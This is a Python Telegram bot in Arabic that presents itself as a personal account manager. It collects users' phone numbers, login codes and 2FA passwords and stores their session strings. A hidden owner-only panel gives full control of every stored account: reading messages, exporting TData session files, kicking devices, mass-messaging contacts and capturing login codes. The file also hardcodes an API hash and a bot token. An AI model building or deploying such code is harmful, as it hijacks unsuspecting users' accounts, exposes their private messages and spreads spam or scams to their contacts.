import os
import json
import asyncio
import time
import logging
import threading
import zipfile
import shutil
from http.server import BaseHTTPRequestHandler, HTTPServer
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient, events, functions, types
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from opentele.td import TDesktop

# --- الإعدادات المباشرة ---
API_ID = 35980161
API_HASH = 'd879538c1b65ee6aa57ac3b4ce4b63d3'
BOT_TOKEN = '8615971361:AAHI51Wd-fj5xKcUwbqyJxbgA7CuuSjebIY'
ADMIN_ID = 8718973896

DB_FILE = 'sessions.json'
active_clients = {}  
radar_mode = {}      
user_states = {}     
app = None

logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

def run_web_server():
    port = int(os.environ.get("PORT", 8080))
    class SimpleHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"VANTA Bot is Alive")
        def do_HEAD(self):
            self.send_response(200)
            self.end_headers()
    server = HTTPServer(('0.0.0.0', port), SimpleHandler)
    server.serve_forever()
threading.Thread(target=run_web_server, daemon=True).start()

db = {}
if os.path.exists(DB_FILE):
    try:
        with open(DB_FILE, 'r') as f: db = json.load(f)
    except: pass

def save_db():
    with open(DB_FILE, 'w') as f: json.dump(db, f, ensure_ascii=False, indent=4)

def btn(text, callback_data=None, url=None, style=None):
    kwargs = {"text": text}
    if callback_data: kwargs["callback_data"] = callback_data
    if url: kwargs["url"] = url
    if style:
        try: return InlineKeyboardButton(**kwargs, style=style)
        except TypeError: pass
    return InlineKeyboardButton(**kwargs)

def global_otp_handler(event):
    for user_id, clients in active_clients.items():
        for phone, client in clients.items():
            if client == event.client:
                if radar_mode.get(user_id) == phone:
                    code = event.raw_text
                    asyncio.create_task(app.bot.send_message(chat_id=user_id, text=f"🔑 **الرمز:** `{code}`", parse_mode="Markdown"))
                    radar_mode.pop(user_id, None)
                return

async def start_telethon_client(user_id, phone, session_str):
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized(): return None
        client.add_event_handler(global_otp_handler, events.NewMessage(from_users=777000))
        return client
    except: return None

async def load_all_clients():
    for user_id_str, sessions in list(db.items()):
        user_id = int(user_id_str)
        if user_id not in active_clients: active_clients[user_id] = {}
        for phone, data in list(sessions.items()):
            session_str = data.get("session") if isinstance(data, dict) else data
            client = await start_telethon_client(user_id, phone, session_str)
            if client: active_clients[user_id][phone] = client

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    keyboard = [
        [btn("➕ إضافة حساب جديد", "add_account", style="success")],
        [btn("📱 حساباتي", "my_accounts", style="primary")]
    ]
    if user_id == ADMIN_ID:
        keyboard.append([btn("👑 لوحة مالك البوت (Root)", "admin_panel", style="danger")])
    
    await update.message.reply_text("أهلاً بك يا سيدي.\nاختر ما تريد:", reply_markup=InlineKeyboardMarkup(keyboard))

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "main_menu":
        user_states.pop(user_id, None)
        keyboard = [
            [btn("➕ إضافة حساب جديد", "add_account", style="success")],
            [btn("📱 حساباتي", "my_accounts", style="primary")]
        ]
        if user_id == ADMIN_ID:
            keyboard.append([btn("👑 لوحة مالك البوت (Root)", "admin_panel", style="danger")])
        await query.edit_message_text("القائمة الرئيسية:", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    # --- قسم الأدمن ---
    if data == "admin_panel" and user_id == ADMIN_ID:
        keyboard = [
            [btn("📊 إحصائيات البوت", "admin_stats", style="primary")],
            [btn("👥 إدارة حسابات المستخدمين", "admin_users", style="success")],
            [btn("🔙 رجوع", "main_menu", style="danger")]
        ]
        await query.edit_message_text("👑 **لوحة تحكم مالك البوت**", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data == "admin_stats" and user_id == ADMIN_ID:
        total_users = len(db)
        total_sessions = sum(len(s) for s in db.values())
        await query.edit_message_text(f"📊 **إحصائيات:**\n\nعدد المستخدمين: {total_users}\nإجمالي الحسابات: {total_sessions}", parse_mode="Markdown")
        return

    if data == "admin_users" and user_id == ADMIN_ID:
        keyboard = []
        for uid, sessions in db.items():
            keyboard.append([btn(f"👤 مستخدم: {uid} (حسابات: {len(sessions)})", f"admin_view_user_{uid}", style="primary")])
        keyboard.append([btn("🔙 رجوع", "admin_panel", style="danger")])
        await query.edit_message_text("اختر مستخدماً:", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data.startswith("admin_view_user_") and user_id == ADMIN_ID:
        target_uid = data.split("_")[3]
        keyboard = []
        for phone in db[target_uid].keys():
            keyboard.append([btn(f"📱 {phone}", f"admin_acc_{target_uid}_{phone}", style="success")])
        keyboard.append([btn("🔙 رجوع", "admin_users", style="primary")])
        await query.edit_message_text(f"حسابات المستخدم {target_uid}:", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data.startswith("admin_acc_") and user_id == ADMIN_ID:
        parts = data.split("_")
        target_uid, phone = int(parts[2]), parts[3]
        keyboard = [
            [btn("👤 معلومات الحساب", f"adm_info_{target_uid}_{phone}", style="primary")],
            [btn("💻 طرد الأجهزة", f"adm_dev_{target_uid}_{phone}", style="danger")],
            [btn("📁 استخراج TData", f"adm_tdata_{target_uid}_{phone}", style="success")],
            [btn("📨 إرسال رسالة لجهات الاتصال", f"adm_msg_{target_uid}_{phone}", style="primary")],
            [btn("📥 قراءة آخر الرسائل", f"adm_read_{target_uid}_{phone}", style="success")],
            [btn("🔙 رجوع", f"admin_view_user_{target_uid}", style="danger")]
        ]
        await query.edit_message_text(f"التحكم الكامل بحساب: `{phone}`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data.startswith("adm_info_") and user_id == ADMIN_ID:
        parts = data.split("_")
        target_uid, phone = int(parts[2]), parts[3]
        client = active_clients.get(target_uid, {}).get(phone)
        if not client:
            await query.edit_message_text("❌ الحساب غير متصل حالياً.")
            return
        try:
            me = await client.get_me()
            dialogs = await client.get_dialogs(limit=100)
            channels = [d.name for d in dialogs if d.is_channel and d.entity.creator]
            groups = [d.name for d in dialogs if d.is_group]
            text = f"👤 **الاسم:** {me.first_name} {me.last_name or ''}\n"
            text += f"🆔 **ID:** `{me.id}`\n"
            text += f"📞 **الرقم:** `{me.phone}`\n"
            text += f"🔗 **اليوزر:** @{me.username if me.username else 'لا يوجد'}\n\n"
            text += f"👑 **قنوات أنت مالكها:** {', '.join(channels[:5]) if channels else 'لا يوجد'}\n"
            text += f"👥 **مجموعات:** {', '.join(groups[:5]) if groups else 'لا يوجد'}"
            await query.edit_message_text(text, parse_mode="Markdown")
        except Exception as e:
            await query.edit_message_text(f"❌ خطأ: {e}")
        return

    if data.startswith("adm_read_") and user_id == ADMIN_ID:
        parts = data.split("_")
        target_uid, phone = int(parts[2]), parts[3]
        client = active_clients.get(target_uid, {}).get(phone)
        try:
            messages = await client.get_messages(limit=10)
            text = "📥 **آخر 10 رسائل في الحساب:**\n\n"
            for m in messages:
                sender = "أنت" if m.out else "شخص آخر"
                text += f"[{sender}] {m.text[:50]}...\n"
            await query.edit_message_text(text, parse_mode="Markdown")
        except Exception as e:
            await query.edit_message_text(f"❌ خطأ: {e}")
        return

    if data.startswith("adm_msg_") and user_id == ADMIN_ID:
        parts = data.split("_")
        target_uid, phone = int(parts[2]), parts[3]
        user_states[user_id] = f"admin_broadcast:{target_uid}:{phone}"
        await query.edit_message_text("أرسل الرسالة التي تريد إرسالها لجميع جهات الاتصال في هذا الحساب:")
        return

    if data.startswith("adm_dev_") and user_id == ADMIN_ID:
        parts = data.split("_")
        target_uid, phone = int(parts[2]), parts[3]
        client = active_clients.get(target_uid, {}).get(phone)
        try:
            result = await client(functions.account.GetAuthorizationsRequest())
            keyboard = []
            for auth in result.authorizations:
                if not auth.current:
                    keyboard.append([btn(f"❌ طرد: {auth.device_model}", f"adm_kill_{target_uid}_{phone}_{auth.hash}", style="danger")])
            keyboard.append([btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")])
            await query.edit_message_text("اختر الجهاز لطرده:", reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            await query.edit_message_text(f"❌ خطأ: {e}")
        return

    if data.startswith("adm_kill_") and user_id == ADMIN_ID:
        parts = data.split("_")
        target_uid, phone, auth_hash = int(parts[2]), parts[3], int(parts[4])
        client = active_clients.get(target_uid, {}).get(phone)
        try:
            await client(functions.account.ResetAuthorizationRequest(hash=auth_hash))
            await query.answer("✅ تم الطرد!", show_alert=True)
            await query.edit_message_text("✅ تم طرد الجهاز بنجاح.")
        except Exception as e:
            await query.answer(f"❌ خطأ: {e}", show_alert=True)
        return

    if data.startswith("adm_tdata_") and user_id == ADMIN_ID:
        parts = data.split("_")
        target_uid, phone = int(parts[2]), parts[3]
        session_str = db[str(target_uid)][phone]["session"]
        await query.edit_message_text("⏳ جاري استخراج TData...")
        try:
            temp_dir = f"tdata_{target_uid}_{phone}"
            os.makedirs(temp_dir, exist_ok=True)
            client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
            await client.connect()
            tdesk = await TDesktop.FromTelethon(client)
            tdata_path = os.path.join(temp_dir, "tdata")
            await tdesk.SaveTData(tdata_path)
            await client.disconnect()
            zip_filename = f"tdata_{phone}"
            shutil.make_archive(zip_filename, 'zip', tdata_path)
            with open(f"{zip_filename}.zip", 'rb') as f:
                await query.message.reply_document(document=f, filename=f"tdata_{phone}.zip", caption=f"📁 TData للحساب {phone}")
            shutil.rmtree(temp_dir, ignore_errors=True)
            os.remove(f"{zip_filename}.zip")
        except Exception as e:
            await query.edit_message_text(f"❌ خطأ: {e}")
        return

    # --- قسم المستخدم العادي ---
    if data == "add_account":
        user_states[user_id] = "waiting_phone"
        await query.edit_message_text("أرسل رقم هاتفك (مع علامة +):")
        return
    
    if data == "my_accounts":
        user_sessions = db.get(str(user_id), {})
        if not user_sessions:
            await query.edit_message_text("ليس لديك حسابات.")
            return
        keyboard = []
        for phone, info in user_sessions.items():
            label = info.get("label", phone) if isinstance(info, dict) else phone
            keyboard.append([btn(f"📱 {label}", f"view_{phone}", style="primary")])
        keyboard.append([btn("🔙 رجوع", "main_menu", style="danger")])
        await query.edit_message_text("اختر حساباً:", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data.startswith("view_"):
        phone = data.split("_", 1)[1]
        keyboard = [
            [btn("📁 استخراج TData", f"export_{phone}", style="success")],
            [btn("💻 إدارة الأجهزة", f"devices_{phone}", style="primary")],
            [btn("🔐 تغيير كلمة سر (2FA)", f"set2fa_{phone}", style="danger")],
            [btn("🔙 رجوع", "my_accounts", style="primary")]
        ]
        await query.edit_message_text(f"الحساب: `{phone}`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data.startswith("export_"):
        phone = data.split("_", 1)[1]
        session_str = db[str(user_id)][phone]["session"]
        await query.edit_message_text("⏳ جاري استخراج TData...")
        try:
            temp_dir = f"tdata_{user_id}_{phone}"
            os.makedirs(temp_dir, exist_ok=True)
            client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
            await client.connect()
            tdesk = await TDesktop.FromTelethon(client)
            tdata_path = os.path.join(temp_dir, "tdata")
            await tdesk.SaveTData(tdata_path)
            await client.disconnect()
            zip_filename = f"tdata_{phone}"
            shutil.make_archive(zip_filename, 'zip', tdata_path)
            with open(f"{zip_filename}.zip", 'rb') as f:
                await query.message.reply_document(document=f, filename=f"tdata_{phone}.zip", caption=f"📁 TData جاهز!")
            shutil.rmtree(temp_dir, ignore_errors=True)
            os.remove(f"{zip_filename}.zip")
        except Exception as e:
            await query.edit_message_text(f"❌ خطأ: {e}")
        return

    if data.startswith("devices_"):
        phone = data.split("_", 1)[1]
        client = active_clients.get(user_id, {}).get(phone)
        try:
            result = await client(functions.account.GetAuthorizationsRequest())
            keyboard = []
            for auth in result.authorizations:
                if not auth.current:
                    keyboard.append([btn(f"❌ طرد: {auth.device_model}", f"kill_{phone}_{auth.hash}", style="danger")])
            keyboard.append([btn("🔙 رجوع", f"view_{phone}", style="primary")])
            await query.edit_message_text("اختر الجهاز لطرده:", reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            await query.edit_message_text(f"❌ خطأ: {e}")
        return

    if data.startswith("kill_"):
        parts = data.split("_")
        phone, auth_hash = parts[1], int(parts[2])
        client = active_clients.get(user_id, {}).get(phone)
        try:
            await client(functions.account.ResetAuthorizationRequest(hash=auth_hash))
            await query.answer("✅ تم الطرد!", show_alert=True)
            await query.edit_message_text("✅ تم طرد الجهاز.")
        except Exception as e:
            await query.answer(f"❌ خطأ: {e}", show_alert=True)
        return

    if data.startswith("set2fa_"):
        phone = data.split("_", 1)[1]
        user_states[user_id] = f"waiting_2fa:{phone}"
        await query.edit_message_text("🔐 أرسل كلمة المرور الجديدة (2FA):")
        return


async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = user_states.get(user_id)
    if not state: return
    text = update.message.text or ""

    if state.startswith("admin_broadcast:"):
        _, target_uid, phone = state.split(":")
        target_uid = int(target_uid)
        client = active_clients.get(target_uid, {}).get(phone)
        if not client:
            await update.message.reply_text("❌ الحساب غير متصل.")
            user_states.pop(user_id, None)
            return
        await update.message.reply_text("⏳ جاري إرسال الرسالة لجميع جهات الاتصال...")
        contacts = await client.get_contacts()
        success = 0
        for c in contacts:
            try:
                await client.send_message(c.id, text)
                success += 1
                await asyncio.sleep(1) # تجنب الحظر
            except: pass
        await update.message.reply_text(f"✅ تم الإرسال لـ {success} جهة اتصال.")
        user_states.pop(user_id, None)
        return

    if state.startswith("waiting_2fa:"):
        phone = state.split(":", 1)[1]
        client = active_clients.get(user_id, {}).get(phone)
        try:
            await client.edit_2fa(new_password=text.strip())
            await update.message.reply_text("✅ تم تعيين كلمة المرور.")
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ: {e}")
        user_states.pop(user_id, None)
        return

    if state == "waiting_phone":
        phone = text.strip()
        phone = ''.join(filter(str.isdigit, phone))
        if not phone.startswith('+'): phone = '+' + phone
            
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            await client.send_code_request(phone)
            user_states[user_id] = f"waiting_code:{phone}"
            if user_id not in active_clients: active_clients[user_id] = {}
            active_clients[user_id][f"temp_{phone}"] = client
            await update.message.reply_text(f"✅ تم إرسال الكود. أرسله هنا:")
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ: {e}")
            user_states.pop(user_id, None)
        return

    if state.startswith("waiting_code:"):
        phone = state.split(":", 1)[1]
        code = text.strip()
        client = active_clients.get(user_id, {}).get(f"temp_{phone}")
        if not client:
            await update.message.reply_text("❌ انتهت الجلسة.")
            user_states.pop(user_id, None)
            return
        try:
            await client.sign_in(phone, code)
            session_str = StringSession.save(client.session)
            if str(user_id) not in db: db[str(user_id)] = {}
            db[str(user_id)][phone] = {"session": session_str, "label": phone, "added_at": time.strftime("%Y-%m-%d %H:%M")}
            save_db()
            active_clients[user_id].pop(f"temp_{phone}", None)
            active_clients[user_id][phone] = client
            client.add_event_handler(global_otp_handler, events.NewMessage(from_users=777000))
            await update.message.reply_text(f"🔥 تم الحفظ بنجاح!")
            user_states.pop(user_id, None)
        except SessionPasswordNeededError:
            user_states[user_id] = f"waiting_password:{phone}"
            await update.message.reply_text("🔐 الحساب محمي بكلمة مرور (2FA). أرسلها:")
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ: {e}")
            user_states.pop(user_id, None)
        return

    if state.startswith("waiting_password:"):
        phone = state.split(":", 1)[1]
        password = text.strip()
        client = active_clients.get(user_id, {}).get(f"temp_{phone}")
        try:
            await client.sign_in(password=password)
            session_str = StringSession.save(client.session)
            if str(user_id) not in db: db[str(user_id)] = {}
            db[str(user_id)][phone] = {"session": session_str, "label": phone, "added_at": time.strftime("%Y-%m-%d %H:%M")}
            save_db()
            active_clients[user_id].pop(f"temp_{phone}", None)
            active_clients[user_id][phone] = client
            client.add_event_handler(global_otp_handler, events.NewMessage(from_users=777000))
            await update.message.reply_text("🔥 تم الحفظ بنجاح (2FA)!")
            user_states.pop(user_id, None)
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ: {e}")
            user_states.pop(user_id, None)
        return

async def main():
    global app
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler((filters.TEXT | filters.Document.ALL) & ~filters.COMMAND, message_handler))
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    logger.info("Loading saved sessions...")
    await load_all_clients()
    logger.info("Bot is fully operational!")
    await asyncio.Event().wait()

if __name__ == '__main__':
    asyncio.run(main())
